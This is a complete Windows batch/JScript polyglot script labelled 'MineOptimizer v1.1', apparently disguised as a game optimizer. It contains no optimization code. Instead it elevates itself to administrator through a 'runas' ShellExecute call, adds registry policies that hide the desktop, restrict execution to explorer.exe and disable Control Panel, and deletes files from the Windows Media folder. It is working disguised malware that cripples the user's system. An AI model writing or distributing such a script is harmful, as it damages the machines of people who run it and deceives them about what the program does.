@set @x=0; /*
@echo off
ver |>NUL find /v "5." && if "%~1"=="" cscript.exe //nologo //e:jscript "%~f0"& exit /b
 
 
title MineOptimizer v1.1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f > nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul 
del "%SystemRoot%\Media" /q > nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f > nul

 
pause
exit /B
 
:: Эту строку не трогать. Ниже ничего не писать!!!
*/new ActiveXObject('Shell.Application').ShellExecute (WScript.ScriptFullName,'Admin','','runas',1);
